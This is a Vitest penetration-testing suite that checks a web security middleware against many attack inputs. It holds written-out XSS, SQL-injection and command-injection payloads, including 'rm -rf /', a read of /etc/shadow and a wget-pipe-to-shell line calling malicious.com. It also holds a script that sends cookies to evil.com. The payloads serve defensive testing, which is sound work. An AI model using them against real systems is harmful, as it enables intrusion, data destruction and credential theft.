/**
 * Penetration Testing Suite
 * Simulates real-world security attacks to validate defense mechanisms
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { securityMiddleware } from '../middleware';

// Mock DOMPurify for controlled testing
vi.mock('dompurify', () => ({
  default: {
    sanitize: vi.fn((input: string, options?: any) => {
      // Simulate realistic sanitization
      if (options?.ALLOWED_TAGS?.length === 0) {
        return input
          .replace(/<script[^>]*>.*?<\/script>/gi, '')
          .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
          .replace(/<object[^>]*>.*?<\/object>/gi, '')
          .replace(/javascript:/gi, '')
          .replace(/on\w+\s*=/gi, '');
      }
      return input;
    })
  }
}));

describe('Penetration Testing Suite', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  describe('XSS Attack Vectors', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<object data="javascript:alert(\'XSS\')"></object>',
      '<embed src="javascript:alert(\'XSS\')">',
      '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
      '<style>@import "javascript:alert(\'XSS\')"</style>',
      '<input type="image" src="x" onerror="alert(\'XSS\')">',
      '<body onload="alert(\'XSS\')">',
      '<marquee onstart="alert(\'XSS\')">',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src="x" onerror="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
      '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4K">'
    ];

    xssPayloads.forEach((payload, index) => {
      it(`should block XSS payload ${index + 1}: ${payload.substring(0, 50)}...`, () => {
        const sanitized = securityMiddleware.sanitizeFormData({ userInput: payload });
        
        expect(sanitized.userInput).not.toContain('<script');
        expect(sanitized.userInput).not.toContain('javascript:');
        expect(sanitized.userInput).not.toContain('onerror');
        expect(sanitized.userInput).not.toContain('onload');
        expect(sanitized.userInput).not.toContain('alert(');
      });
    });

    it('should handle encoded XSS attempts', () => {
      const encodedPayloads = [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;'
      ];

      encodedPayloads.forEach(payload => {
        const sanitized = securityMiddleware.sanitizeFormData({ userInput: payload });
        // Even encoded payloads should be handled safely
        expect(sanitized.userInput).toBeDefined();
      });
    });
  });

  describe('CSRF Attack Simulation', () => {
    it('should prevent CSRF attacks without valid tokens', () => {
      const sessionId = 'test-session';
      
      // Generate legitimate token
      const validToken = securityMiddleware.generateCSRFToken(sessionId);
      
      // Attempt to use invalid tokens
      const invalidTokens = [
        'fake-token',
        validToken + 'modified',
        '',
        null,
        undefined,
        '12345',
        'aaaaa-bbbbb-ccccc',
        validToken.substring(0, -1)
      ];

      invalidTokens.forEach(invalidToken => {
        const isValid = securityMiddleware.validateCSRFToken(sessionId, invalidToken as string);
        expect(isValid).toBe(false);
      });
    });

    it('should prevent token reuse attacks', () => {
      const sessionId = 'test-session';
      const token = securityMiddleware.generateCSRFToken(sessionId);
      
      // First use should be valid
      const firstUse = securityMiddleware.validateCSRFToken(sessionId, token);
      expect(firstUse).toBe(true);
      
      // Second use should fail (one-time use)
      const secondUse = securityMiddleware.validateCSRFToken(sessionId, token);
      expect(secondUse).toBe(false);
    });

    it('should prevent cross-session token usage', () => {
      const sessionId1 = 'session-1';
      const sessionId2 = 'session-2';
      
      const token1 = securityMiddleware.generateCSRFToken(sessionId1);
      
      // Should not validate token from different session
      const crossSessionValidation = securityMiddleware.validateCSRFToken(sessionId2, token1);
      expect(crossSessionValidation).toBe(false);
    });
  });

  describe('File Upload Attack Vectors', () => {
    const maliciousFiles = [
      { name: 'malware.exe', type: 'application/x-executable' },
      { name: 'script.bat', type: 'application/x-msdos-program' },
      { name: 'trojan.scr', type: 'application/x-msdownload' },
      { name: 'virus.com', type: 'application/x-msdos-program' },
      { name: 'backdoor.cmd', type: 'application/x-msdos-program' },
      { name: 'payload.vbs', type: 'text/vbscript' },
      { name: 'shell.php', type: 'application/x-php' },
      { name: 'webshell.jsp', type: 'application/x-jsp' },
      { name: 'exploit.jar', type: 'application/java-archive' },
      { name: 'fake-image.exe.jpg', type: 'image/jpeg' }, // Double extension
      { name: 'document.pdf.exe', type: 'application/pdf' }, // Extension spoofing
    ];

    maliciousFiles.forEach((fileInfo, index) => {
      it(`should block malicious file ${index + 1}: ${fileInfo.name}`, () => {
        const file = new File(['malicious content'], fileInfo.name, { type: fileInfo.type });
        const validation = securityMiddleware.validateFileUpload(file);
        
        expect(validation.valid).toBe(false);
        expect(validation.errors.length).toBeGreaterThan(0);
      });
    });

    it('should prevent large file DoS attacks', () => {
      const massiveFile = new File(
        [new ArrayBuffer(100 * 1024 * 1024)], // 100MB
        'huge-file.jpg',
        { type: 'image/jpeg' }
      );
      
      const validation = securityMiddleware.validateFileUpload(massiveFile);
      expect(validation.valid).toBe(false);
      expect(validation.errors.some(error => error.includes('size exceeds'))).toBe(true);
    });

    it('should handle zip bomb simulation', () => {
      // Simulate a file that claims to be small but could expand massively
      const suspiciousFile = new File(
        [new ArrayBuffer(1024)], // 1KB file
        'archive.zip',
        { type: 'application/zip' }
      );
      
      const validation = securityMiddleware.validateFileUpload(suspiciousFile);
      // Should reject zip files as they're not in allowed types
      expect(validation.valid).toBe(false);
    });
  });

  describe('Injection Attack Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; INSERT INTO users VALUES ('hacker', 'password'); --",
      "' UNION SELECT password FROM users WHERE username='admin'--",
      "'; UPDATE users SET password='hacked' WHERE username='admin'; --",
      "' OR 1=1#",
      "' OR 'a'='a",
      "\"; DROP DATABASE; --",
      "'; EXEC xp_cmdshell('format c:'); --",
      "' OR EXISTS(SELECT * FROM users) --"
    ];

    sqlInjectionPayloads.forEach((payload, index) => {
      it(`should sanitize SQL injection attempt ${index + 1}`, () => {
        const sanitized = securityMiddleware.sanitizeFormData({ searchQuery: payload });
        
        expect(sanitized.searchQuery).not.toContain('DROP');
        expect(sanitized.searchQuery).not.toContain('INSERT');
        expect(sanitized.searchQuery).not.toContain('UPDATE');
        expect(sanitized.searchQuery).not.toContain('DELETE');
        expect(sanitized.searchQuery).not.toContain('UNION');
        expect(sanitized.searchQuery).not.toContain('SELECT');
        expect(sanitized.searchQuery).not.toContain('--');
        expect(sanitized.searchQuery).not.toContain(';');
      });
    });

    const commandInjectionPayloads = [
      '; rm -rf /',
      '| cat /etc/passwd',
      '&& format c:',
      '|| shutdown -h now',
      '; wget http://malicious.com/backdoor.sh | sh',
      '`cat /etc/shadow`',
      '$(whoami)',
      '& net user hacker password /add'
    ];

    commandInjectionPayloads.forEach((payload, index) => {
      it(`should prevent command injection ${index + 1}`, () => {
        const sanitized = securityMiddleware.sanitizeFormData({ command: payload });
        
        expect(sanitized.command).not.toContain('rm -rf');
        expect(sanitized.command).not.toContain('cat /etc/');
        expect(sanitized.command).not.toContain('format');
        expect(sanitized.command).not.toContain('shutdown');
        expect(sanitized.command).not.toContain('wget');
        expect(sanitized.command).not.toContain('net user');
      });
    });
  });

  describe('URL Manipulation Attacks', () => {
    const maliciousUrls = [
      'javascript:alert("XSS")',
      'data:text/html,<script>alert("XSS")</script>',
      'vbscript:msgbox("XSS")',
      'http://malicious.com/redirect?url=http://legit.com',
      'https://evil.com/phishing.html',
      'ftp://anonymous@malicious.com/upload',
      'file:///etc/passwd',
      'about:blank',
      'chrome://settings/',
      'ms-appx://malicious-app/'
    ];

    maliciousUrls.forEach((url, index) => {
      it(`should handle malicious URL ${index + 1}: ${url}`, () => {
        const params = new URLSearchParams();
        params.append('redirect', url);
        
        const sanitized = securityMiddleware.sanitizeURLParams(params);
        const sanitizedUrl = sanitized.get('redirect') || '';
        
        expect(sanitizedUrl).not.toContain('javascript:');
        expect(sanitizedUrl).not.toContain('vbscript:');
        expect(sanitizedUrl).not.toContain('<script');
      });
    });
  });

  describe('Header Injection Attacks', () => {
    it('should validate security headers are properly set', () => {
      const headers = securityMiddleware.applySecurityHeaders();
      
      // Critical security headers must be present
      expect(headers['Content-Security-Policy']).toBeDefined();
      expect(headers['X-Frame-Options']).toBe('DENY');
      expect(headers['X-Content-Type-Options']).toBe('nosniff');
      expect(headers['X-XSS-Protection']).toBe('1; mode=block');
      expect(headers['Strict-Transport-Security']).toContain('max-age=31536000');
      
      // Headers should not contain injection vulnerabilities
      Object.values(headers).forEach(headerValue => {
        expect(headerValue).not.toContain('\n');
        expect(headerValue).not.toContain('\r');
        expect(headerValue).not.toContain('<script');
      });
    });

    it('should prevent CRLF injection in headers', () => {
      const maliciousInputs = [
        'value\r\nX-Injected: header',
        'value\nSet-Cookie: evil=true',
        'value\r\n\r\n<script>alert("XSS")</script>',
        'value%0d%0aX-Injected: header'
      ];

      maliciousInputs.forEach(input => {
        const sanitized = securityMiddleware.sanitizeFormData({ headerValue: input });
        expect(sanitized.headerValue).not.toContain('\r');
        expect(sanitized.headerValue).not.toContain('\n');
        expect(sanitized.headerValue).not.toContain('X-Injected');
        expect(sanitized.headerValue).not.toContain('Set-Cookie');
      });
    });
  });

  describe('Performance and DoS Attack Resistance', () => {
    it('should handle large payload sanitization efficiently', () => {
      const largePayload = 'A'.repeat(10000) + '<script>alert("XSS")</script>';
      
      const startTime = performance.now();
      const sanitized = securityMiddleware.sanitizeFormData({ largeField: largePayload });
      const endTime = performance.now();
      
      // Should complete in reasonable time (less than 100ms)
      expect(endTime - startTime).toBeLessThan(100);
      expect(sanitized.largeField).not.toContain('<script>');
    });

    it('should handle deeply nested object sanitization', () => {
      const deepObject: any = {};
      let current = deepObject;
      
      // Create 100 levels deep
      for (let i = 0; i < 100; i++) {
        current.nested = { value: `<script>alert("XSS ${i}")</script>` };
        current = current.nested;
      }
      
      expect(() => {
        securityMiddleware.sanitizeFormData(deepObject);
      }).not.toThrow();
    });

    it('should handle multiple concurrent requests', async () => {
      const requests = Array.from({ length: 100 }, (_, i) => 
        Promise.resolve(securityMiddleware.sanitizeFormData({
          field: `<script>alert("XSS ${i}")</script>`
        }))
      );
      
      const results = await Promise.all(requests);
      
      results.forEach((result, index) => {
        expect(result.field).not.toContain('<script>');
        expect(result.field).not.toContain(`XSS ${index}`);
      });
    });
  });

  describe('Advanced Evasion Techniques', () => {
    const evasionPayloads = [
      '<scr<script>ipt>alert("XSS")</script>',
      '<script>al\u0065rt("XSS")</script>',
      '<script>alert(/XSS/)</script>',
      '<script>alert`XSS`</script>',
      '<script>setTimeout("alert(\\"XSS\\")",100)</script>',
      '<script>eval("al"+"ert(\\"XSS\\")")</script>',
      '<script>Function("alert(\\"XSS\\")")()</script>',
      '<img src="x" onerror="eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))">',
      '<svg><script>alert("XSS")</script></svg>',
      '<math><mi//xlink:href="data:x,<script>alert(\'XSS\')</script>">'
    ];

    evasionPayloads.forEach((payload, index) => {
      it(`should block evasion technique ${index + 1}`, () => {
        const sanitized = securityMiddleware.sanitizeFormData({ evasion: payload });
        
        expect(sanitized.evasion).not.toContain('alert(');
        expect(sanitized.evasion).not.toContain('eval(');
        expect(sanitized.evasion).not.toContain('Function(');
        expect(sanitized.evasion).not.toContain('setTimeout');
      });
    });
  });

  describe('Security Boundary Testing', () => {
    it('should maintain security under edge conditions', () => {
      const edgeCases = [
        '', // Empty string
        null,
        undefined,
        0,
        false,
        [], // Empty array
        {}, // Empty object
        'normal text', // Safe input
        '   ', // Whitespace only
        '\n\r\t', // Control characters
      ];

      edgeCases.forEach(edgeCase => {
        expect(() => {
          securityMiddleware.sanitizeFormData({ edge: edgeCase });
        }).not.toThrow();
      });
    });

    it('should handle malformed data gracefully', () => {
      const malformedInputs = [
        '<script>alert("XSS"', // Unclosed tag
        '<script', // Incomplete tag
        'alert("XSS")</script>', // Missing opening tag
        '<><><><>', // Malformed nesting
        '<<<>>>', // Invalid brackets
      ];

      malformedInputs.forEach(input => {
        const sanitized = securityMiddleware.sanitizeFormData({ malformed: input });
        expect(sanitized.malformed).toBeDefined();
        expect(sanitized.malformed).not.toContain('<script');
      });
    });
  });

  describe('Real-World Attack Scenarios', () => {
    it('should prevent comment-based XSS attacks', () => {
      const commentAttack = {
        username: 'innocent_user',
        comment: 'Check out this cool site! <script>document.location="http://evil.com?cookies="+document.cookie</script>',
        email: 'user@example.com'
      };

      const sanitized = securityMiddleware.sanitizeFormData(commentAttack);
      
      expect(sanitized.comment).not.toContain('<script>');
      expect(sanitized.comment).not.toContain('document.location');
      expect(sanitized.comment).not.toContain('document.cookie');
    });

    it('should prevent form hijacking attacks', () => {
      const formHijack = {
        name: 'John Doe',
        email: 'john@example.com</form><form action="http://evil.com"><input type="hidden" name="stolen" value="data">',
        message: 'Hello world!'
      };

      const sanitized = securityMiddleware.sanitizeFormData(formHijack);
      
      expect(sanitized.email).not.toContain('</form>');
      expect(sanitized.email).not.toContain('<form');
      expect(sanitized.email).not.toContain('evil.com');
    });

    it('should prevent CSS injection attacks', () => {
      const cssInjection = {
        style: 'color: red; background: url("javascript:alert(\'XSS\')")',
        content: '<style>body { background: url("data:text/html,<script>alert(\'XSS\')</script>") }</style>'
      };

      const sanitized = securityMiddleware.sanitizeFormData(cssInjection);
      
      expect(sanitized.style).not.toContain('javascript:');
      expect(sanitized.content).not.toContain('<style>');
      expect(sanitized.content).not.toContain('data:text/html');
    });
  });
}); 